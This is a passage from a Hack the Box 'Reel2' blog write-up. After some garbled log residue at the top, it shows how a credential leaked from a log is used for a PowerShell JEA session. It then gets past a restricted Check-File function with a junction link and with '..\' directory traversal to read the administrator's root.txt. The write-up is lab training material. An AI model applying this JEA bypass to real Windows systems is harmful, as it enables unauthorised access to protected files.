             ÃëÍäèÃÚapp://.__storejs__test__Íá¸³D9
                                                  META:app://.
                                                             ¿Ë ¶ñ÷ÃÚapp://.__storejs__test__¾íãD;
                                                                                                  META:app://.
      ý¤×éò÷ÃÚapp://.__storejs__test__Á
                                       £úD=
                                           META:app://.
                                                      ÕÃ‡âžðÄÚapp://.__storejs__test__†q¿D?
                                                                                           META:app://.
                                                                                                     Þ÷Èç·ÆÚapp://.__storejs__test__F­ˆºDA
                                   META:app://.
                                              µðóò¿·ÆÚapp://.__storejs__test__‰•™DC
                                                                                   META:app://.
                                                                                              —´¦ÏÉÁÆÚapp://.__storejs__test__
</pre></table></code></div></div><p>One string stuck out in this log:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>"&lt;p&gt;Credentials for JEA&lt;/p&gt;&lt;p&gt;jea_test_account:Ab!Q@vcg^%@#1&lt;/p&gt;"
</pre></table></code></div></div><p>It looked like I had found a password for the <code class="language-plaintext highlighter-rouge">jea_test_account</code> I had seen files referencing earlier. I tried logging into this account like I did with <code class="language-plaintext highlighter-rouge">k.svensson</code>, but it failed to authenticate. I did some research on how to use PowerShell remoting with JEA, and again found that Microsoft’s documentation was very helpful.</p><ul><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1</a><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1</a></ul><blockquote><p>To use JEA interactively, you need:</p><ul><li>The name of the computer you’re connecting to (can be the local machine)<li>The name of the JEA endpoint registered on that computer<li>Credentials that have access to the JEA endpoint on that computer</ul><p>Given that information, you can start a JEA session using the New-PSSession or Enter-PSSession cmdlets.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$nonAdminCred = Get-Credential Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance -Credential $nonAdminCred
</pre></table></code></div></div><p>If the current user account has access to the JEA endpoint, you can omit the Credential parameter.</p></blockquote><ul><li><a href="https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession">https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession</a></ul><p>In order to pass both the username and password into the <code class="language-plaintext highlighter-rouge">New-PSSession</code> cmdlet, I had to create a new object that contained this information.</p><h3 id="shell-as-jea_test_account">Shell as <code class="language-plaintext highlighter-rouge">jea_test_account</code></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/reel2]
└─<span class="nv">$ </span>pwsh                       
PowerShell 7.0.0
Copyright <span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

https://aka.ms/powershell
Type <span class="s1">'help'</span> to get help.

   A new PowerShell stable release is available: v7.1.2 
   Upgrade now, or check out the release page at:       
     https://aka.ms/PowerShell-Release?tag<span class="o">=</span>v7.1.2       

PS /home/zweilos/htb/reel2&gt; <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"jea_test_account"</span>
PS /home/zweilos/htb/reel2&gt; <span class="nv">$pass</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">"Ab!Q@vcg^%@#1"</span> <span class="nt">-AsPlainText</span> 
PS /home/zweilos/htb/reel2&gt; <span class="nv">$creds</span> <span class="o">=</span> new-object <span class="nt">-typename</span> System.Management.Automation.PSCredential <span class="nt">-argumentlist</span> <span class="o">(</span><span class="nv">$user</span>, <span class="nv">$pass</span><span class="o">)</span>                    
PS /home/zweilos/htb/reel2&gt; <span class="nv">$jeaSession</span> <span class="o">=</span> New-PSSession 10.10.10.210 <span class="nt">-Credential</span> <span class="nv">$creds</span> <span class="nt">-Authentication</span> Negotiate
New-PSSession: <span class="o">[</span>10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.                                                                                      
PS /home/zweilos/htb/reel2&gt; <span class="nv">$jeaSession</span> <span class="o">=</span> New-PSSession 10.10.10.210 <span class="nt">-Credential</span> <span class="nv">$creds</span> <span class="nt">-Authentication</span> Negotiate <span class="nt">-ConfigurationName</span> <span class="s2">"jea_test_account"</span>                                                       
PS /home/zweilos/htb/reel2&gt; Enter-PSSession <span class="nv">$jeaSession</span>
</pre></table></code></div></div><p>After creating an object with the credentials and specifying the connection with the configuration name, I was able to connect.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; whoami /all
The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct 
and try again.
    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

[10.10.10.210]: P&gt; .{whoami /all}
The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
    + CategoryInfo          : ParserError: (.{whoami /all}:String) [], ParseException
    + FullyQualifiedErrorId : ScriptsNotAllowed
</pre></table></code></div></div><p>I went from one restricted account to a more restricted account…. “no-language mode”.</p><ul><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1</a></ul><blockquote><p>When the PowerShell prompt changes to <code class="language-plaintext highlighter-rouge">[localhost]: PS&gt;</code> you know that you’re now interacting with the remote JEA session. You can run <code class="language-plaintext highlighter-rouge">Get-Command</code> to check which commands are available. Consult with your administrator to learn if there are any restrictions on the available parameters or allowed parameter values.</p><p>Remember, JEA sessions operate in NoLanguage mode. Some of the ways you typically use PowerShell may not be available. For instance, you can’t use variables to store data or inspect the properties on objects returned from cmdlets.</p></blockquote><h3 id="check-file">Check-File</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>CommandType     Name                                               Version    Source                  
-----------     ----                                               -------    ------                  
Function        Check-File                                                                            
Function        Clear-Host                                                                            
Function        Exit-PSSession                                                                        
Function        Get-Command                                                                           
Function        Get-FormatData                                                                        
Function        Get-Help                                                                              
Function        Measure-Object                                                                        
Function        Out-Default                                                                           
Function        Select-Object                                                                         


[10.10.10.210]: PS&gt;Get-Help Check-File
Cannot find path '' because it does not exist.
    + CategoryInfo          : ObjectNotFound: (:) [Get-Help], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetHelpCommand
</pre></table></code></div></div><p>I used <code class="language-plaintext highlighter-rouge">Get-Command</code> to see what commands I had access to, and found that it was pretty much the same list as before with one addition. I tried to access the help information for the <code class="language-plaintext highlighter-rouge">Check-File</code> command, but I got a <code class="language-plaintext highlighter-rouge">Cannot find path</code> error.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="o">[</span>10.10.10.210]: P&gt; .<span class="o">{</span><span class="nb">type </span>jea_test_account.psrc<span class="o">}</span>
@<span class="o">{</span>

<span class="c"># ID used to uniquely identify this document</span>
GUID <span class="o">=</span> <span class="s1">'08c0fdac-36ef-43b5-931f-68171c4c8200'</span>

<span class="c"># Author of this document</span>
Author <span class="o">=</span> <span class="s1">'cube0x0'</span>

<span class="c"># Description of the functionality provided by these settings</span>
<span class="c"># Description = ''</span>

<span class="c"># Company associated with this document</span>
CompanyName <span class="o">=</span> <span class="s1">'Unknown'</span>

<span class="c"># Copyright statement for this document</span>
Copyright <span class="o">=</span> <span class="s1">'(c) 2020 cube0x0. All rights reserved.'</span>

<span class="c"># Modules to import when applied to a session</span>
<span class="c"># ModulesToImport = 'MyCustomModule', @{ ModuleName = 'MyCustomModule'; ModuleVersion = '1.0.0.0'; GUID = '4d30d5f0-cb16-4898-812d-f20a6c596bdf' }</span>

<span class="c"># Aliases to make visible when applied to a session</span>
<span class="c"># VisibleAliases = 'Item1', 'Item2'</span>

<span class="c"># Cmdlets to make visible when applied to a session</span>
<span class="c"># VisibleCmdlets = 'Invoke-Cmdlet1', @{ Name = 'Invoke-Cmdlet2'; Parameters = @{ Name = 'Parameter1'; ValidateSet = 'Item1', 'Item2' }, @{ Name = 'Parameter2'; ValidatePattern = 'L*' } }</span>

<span class="c"># Functions to make visible when applied to a session</span>
<span class="c"># VisibleFunctions = 'Invoke-Function1', @{ Name = 'Invoke-Function2'; Parameters = @{ Name = 'Parameter1'; ValidateSet = 'Item1', 'Item2' }, @{ Name = 'Parameter2'; ValidatePattern = 'L*' } }</span>

<span class="c"># External commands (scripts and applications) to make visible when applied to a session</span>
<span class="c"># VisibleExternalCommands = 'Item1', 'Item2'</span>

<span class="c"># Providers to make visible when applied to a session</span>
<span class="c"># VisibleProviders = 'Item1', 'Item2'</span>

<span class="c"># Scripts to run when applied to a session</span>
<span class="c"># ScriptsToProcess = 'C:\ConfigData\InitScript1.ps1', 'C:\ConfigData\InitScript2.ps1'</span>

<span class="c"># Aliases to be defined when applied to a session</span>
<span class="c"># AliasDefinitions = @{ Name = 'Alias1'; Value = 'Invoke-Alias1'}, @{ Name = 'Alias2'; Value = 'Invoke-Alias2'}</span>

<span class="c"># Functions to define when applied to a session</span>
FunctionDefinitions <span class="o">=</span> @<span class="o">{</span>
    <span class="s1">'Name'</span> <span class="o">=</span> <span class="s1">'Check-File'</span>
    <span class="s1">'ScriptBlock'</span> <span class="o">=</span> <span class="o">{</span>param<span class="o">(</span><span class="nv">$Path</span>,<span class="nv">$ComputerName</span><span class="o">=</span><span class="nv">$env</span>:COMPUTERNAME<span class="o">)</span> <span class="o">[</span>bool]<span class="nv">$Check</span><span class="o">=</span><span class="nv">$Path</span> <span class="nt">-like</span> <span class="s2">"D:</span><span class="se">\*</span><span class="s2">"</span> <span class="nt">-or</span> <span class="nv">$Path</span> <span class="nt">-like</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\*</span><span class="s2">"</span> <span class="p">;</span> <span class="k">if</span><span class="o">(</span><span class="nv">$check</span><span class="o">)</span> <span class="o">{</span>get-content <span class="nv">$Path</span><span class="o">}}</span> <span class="o">}</span>

<span class="c"># Variables to define when applied to a session</span>
<span class="c"># VariableDefinitions = @{ Name = 'Variable1'; Value = { 'Dynamic' + 'InitialValue' } }, @{ Name = 'Variable2'; Value = 'StaticInitialValue' }</span>

<span class="c"># Environment variables to define when applied to a session</span>
<span class="c"># EnvironmentVariables = @{ Variable1 = 'Value1'; Variable2 = 'Value2' }</span>

<span class="c"># Type files (.ps1xml) to load when applied to a session</span>
<span class="c"># TypesToProcess = 'C:\ConfigData\MyTypes.ps1xml', 'C:\ConfigData\OtherTypes.ps1xml'</span>

<span class="c"># Format files (.ps1xml) to load when applied to a session</span>
<span class="c"># FormatsToProcess = 'C:\ConfigData\MyFormats.ps1xml', 'C:\ConfigData\OtherFormats.ps1xml'</span>

<span class="c"># Assemblies to load when applied to a session</span>
<span class="c"># AssembliesToLoad = 'System.Web', 'System.OtherAssembly, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'</span>
</pre></table></code></div></div><p>The answer was in the JEA configuration files I had seen earlier. Inside the configuration file <code class="language-plaintext highlighter-rouge">jea_test_account.psrc</code> there was a definition for a custom function <code class="language-plaintext highlighter-rouge">Check-File</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Functions to define when applied to a session</span>
FunctionDefinitions <span class="o">=</span> @<span class="o">{</span>
    <span class="s1">'Name'</span> <span class="o">=</span> <span class="s1">'Check-File'</span>
    <span class="s1">'ScriptBlock'</span> <span class="o">=</span> <span class="o">{</span>param<span class="o">(</span><span class="nv">$Path</span>,<span class="nv">$ComputerName</span><span class="o">=</span><span class="nv">$env</span>:COMPUTERNAME<span class="o">)</span> <span class="o">[</span>bool]<span class="nv">$Check</span><span class="o">=</span><span class="nv">$Path</span> <span class="nt">-like</span> <span class="s2">"D:</span><span class="se">\*</span><span class="s2">"</span> <span class="nt">-or</span> <span class="nv">$Path</span> <span class="nt">-like</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\*</span><span class="s2">"</span> <span class="p">;</span> <span class="k">if</span><span class="o">(</span><span class="nv">$check</span><span class="o">)</span> <span class="o">{</span>get-content <span class="nv">$Path</span><span class="o">}}</span> <span class="o">}</span>
</pre></table></code></div></div><p>This function runs the <code class="language-plaintext highlighter-rouge">Get-Content</code> cmdlet, but first checks to see if the path of the file supplied contains <code class="language-plaintext highlighter-rouge">D:\</code> or <code class="language-plaintext highlighter-rouge">C:\ProgramData\</code>, and only works if this is true. It seems that there must be some file in these directories that would hopefully point me in the right direction.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="o">[</span>10.10.10.210]: PS&gt;.<span class="o">{</span><span class="nb">type </span>jea_test_account.pssc<span class="o">}</span>
@<span class="o">{</span>

<span class="c"># Version number of the schema used for this document</span>
SchemaVersion <span class="o">=</span> <span class="s1">'2.0.0.0'</span>

<span class="c"># ID used to uniquely identify this document</span>
GUID <span class="o">=</span> <span class="s1">'d6a39756-aa53-4ef6-a74b-37c6a80fd796'</span>

<span class="c"># Author of this document</span>
Author <span class="o">=</span> <span class="s1">'cube0x0'</span>

<span class="c"># Description of the functionality provided by these settings</span>
<span class="c"># Description = ''</span>

<span class="c"># Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'</span>
SessionType <span class="o">=</span> <span class="s1">'RestrictedRemoteServer'</span>

<span class="c"># Directory to place session transcripts for this session configuration</span>
<span class="c"># TranscriptDirectory = 'C:\Transcripts\'</span>

<span class="c"># Whether to run this session configuration as the machine's (virtual) administrator account</span>
RunAsVirtualAccount <span class="o">=</span> <span class="nv">$true</span>

<span class="c"># Scripts to run when applied to a session</span>
<span class="c"># ScriptsToProcess = 'C:\ConfigData\InitScript1.ps1', 'C:\ConfigData\InitScript2.ps1'</span>

<span class="c"># User roles (security groups), and the role capabilities that should be applied to them when applied to a session</span>
RoleDefinitions <span class="o">=</span> @<span class="o">{</span>
    <span class="s1">'htb\jea_test_account'</span> <span class="o">=</span> @<span class="o">{</span>
        <span class="s1">'RoleCapabilities'</span> <span class="o">=</span> <span class="s1">'jea_test_account'</span> <span class="o">}</span> <span class="o">}</span>

<span class="c"># Language mode to apply when applied to a session. Can be 'NoLanguage' (recommended), 'RestrictedLanguage', 'ConstrainedLanguage', or 'FullLanguage'</span>
LanguageMode <span class="o">=</span> <span class="s1">'NoLanguage'</span>
</pre></table></code></div></div><p>The second configuration file confirmed my suspicions that I had been locked into <code class="language-plaintext highlighter-rouge">NoLanguage</code> mode, which explained why I couldn’t use custom functions anymore.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{cd D:\}
cd : Cannot find drive. A drive with the name 'D' does not exist.
At line:1 char:3                                                                                       
+ .{cd D:\}                                                                                            
+   ~~~~~~                                                                                             
    + CategoryInfo          : ObjectNotFound: (D:String) [Set-Location], DriveNotFoundException        
    + FullyQualifiedErrorId : DriveNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
</pre></table></code></div></div><p>It did not appear that there even was a <code class="language-plaintext highlighter-rouge">D:\</code> drive, so I checked out the other folder.</p><h3 id="two-paths-forward">Two paths forward</h3><p>I did some research on how to use PowerShell to link files and how to mount new drive letters.</p><ul><li><a href="https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell">https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell</a><li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1</a></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{New-PSDrive -Name "D" -PsProvider "FileSystem" -Root "C:\"}                       

Name           Used (GB)     Free (GB) Provider      Root                                CurrentLocati
                                                                                                    on
----           ---------     --------- --------      ----                                -------------
D                                      FileSystem    C:\                                              


[10.10.10.210]: P&gt; .{cd D:\}
</pre></table></code></div></div><p>Using this, I was able to create a <code class="language-plaintext highlighter-rouge">D:\</code> drive that linked to all of the folders and files in the <code class="language-plaintext highlighter-rouge">C:\</code> drive.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>[10.10.10.210]: P&gt; .{cd D:\Users}
[10.10.10.210]: P&gt; .{ls}


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d-----        7/30/2020  12:13 PM                .NET v2.0                                            
d-----        7/30/2020  12:13 PM                .NET v2.0 Classic                                    
d-----        7/28/2020   2:53 PM                Administrator                                        
d-----        7/30/2020  12:13 PM                Classic .NET AppPool                                 
d-----        7/30/2020   1:17 PM                k.svensson                                           
d-r---        8/22/2013   5:39 PM                Public
</pre></table></code></div></div><p>I was able to link the C drive to the D drive letter as the <code class="language-plaintext highlighter-rouge">k.svensson</code> user, however the <code class="language-plaintext highlighter-rouge">jea_test_account</code> was not able to see the <code class="language-plaintext highlighter-rouge">D:\</code> drive I had created.</p><ul><li><a href="https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell">https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell</a></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;.{New-Item -Path C:\ProgramData\Administrator\ -ItemType SymbolicLink -Value C:\Users\Administrator\}                                                                                      
New-Item : Administrator privilege required for this operation.
At line:1 char:3                                                                                       
+ .{New-Item -Path C:\ProgramData\Administrator\ -ItemType SymbolicLink ...                            
+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\:String) [New-Item], Unauthor  
   izedAccessException                                                                                 
    + FullyQualifiedErrorId : NewItemSymbolicLinkElevationRequired,Microsoft.PowerShell.Commands.NewI  
   temCommand
</pre></table></code></div></div><p>Instead I tried mounting the <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\</code> into the other folder listed in the <code class="language-plaintext highlighter-rouge">Check-File</code> script, <code class="language-plaintext highlighter-rouge">C:\ProgramData\</code>. I did not have permissions to link to the <code class="language-plaintext highlighter-rouge">/Administrator</code> folder directly.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;.{New-Item -Path C:\ProgramData\Desk\ -ItemType Junction -Value C:\Users\Administrator\}                                                                                                   


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                                 
d----l        2/16/2021  11:19 PM                Desk
</pre></table></code></div></div><p>Instead, I created a new folder inside <code class="language-plaintext highlighter-rouge">C:\ProgramData\</code> called <code class="language-plaintext highlighter-rouge">\Desk</code> which linked to the admins folder.</p><h3 id="roottxt">Root.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;Check-File C:\ProgramData\Desk\Desktop\root.txt                                     
e145465135ac264800cee7d8dda0dbba
</pre></table></code></div></div><p>I was then able to use <code class="language-plaintext highlighter-rouge">Check-File</code> to read the contents of the <code class="language-plaintext highlighter-rouge">root.txt</code> by referencing the linked version inside <code class="language-plaintext highlighter-rouge">C:\ProgramData\Desk\Desktop\</code>.</p><h3 id="route-two">Route two</h3><p>After going through all of the trouble to create a link to the folders, I realized that I could also do it much more simply…with directory traversal!</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[10.10.10.210]: PS&gt;Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt

e145465135ac264800cee7d8dda0dbba
</pre></table></code></div></div><p>Since the custom function was looking for a path with the <code class="language-plaintext highlighter-rouge">-Like</code> parameter and a <code class="language-plaintext highlighter-rouge">*</code> wildcard, anything could be put after the path <code class="language-plaintext highlighter-rouge">C:\ProgramData\</code>. This includes directory traversal paths such as <code class="language-plaintext highlighter-rouge">..\</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/0-reel2-pwned.png" alt="" /></p><p>Thanks to <a href="https://app.hackthebox.eu/users/9164"><code class="language-plaintext highlighter-rouge">cube0x0</code></a> for creating this fun and interesting machine! I had read about JEA when it first came out, but I didn’t understand how powerfully restrictive it could be (at least if configured securely!). Thank you for this opportunity to learn how to bypass these protections so I can better learn how to configure Windows networks to be more secure!</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/jea/" class="post-tag no-text-decoration" >jea</a> <a href="/tags/burp/" class="post-tag no-text-decoration" >burp</a> <a href="/tags/wallstant/" class="post-tag no-text-decoration" >wallstant</a> <a href="/tags/owa/" class="post-tag no-text-decoration" >owa</a> <a href="/tags/responder/" class="post-tag no-text-decoration" >responder</a> <a href="/tags/phishing/" class="post-tag no-text-decoration" >phishing</a> <a href="/tags/hard/" class="post-tag no-text-decoration" >hard</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/cube0x0/" class="post-tag no-text-decoration" >cube0x0</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Reel2 Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/reel2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Reel2 Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/reel2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Reel2 Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/reel2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/sharp/"><div class="card-body"> <span class="timeago small" > May 1, 2021 <i class="unloaded">2021-05-01T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sharp Writeup</h3><div class="text-muted small"><p> HTB - Sharp Overview This hard-difficulty Windows machine from Hack the Box was both challenging and fun. As the name suggests, it focuses on a few user-made code projects that use the C Sharp...</p></div></div></a></div><div class="card"> <a href="/posts/sauna/"><div class="card-body"> <span class="timeago small" > Jun 3, 2020 <i class="unloaded">2020-06-03T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna Writeup</h3><div class="text-muted small"><p> HTB - Sauna Overview A fairly easy Windows machine that requires a little ‘outside the box’ thinking in order to get the initial foothold. After that, simple enumeration will give everything e...</p></div></div></a></div><div class="card"> <a href="/posts/oouch/"><div class="card-body"> <span class="timeago small" > Jun 11, 2020 <i class="unloaded">2020-06-11T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Oouch 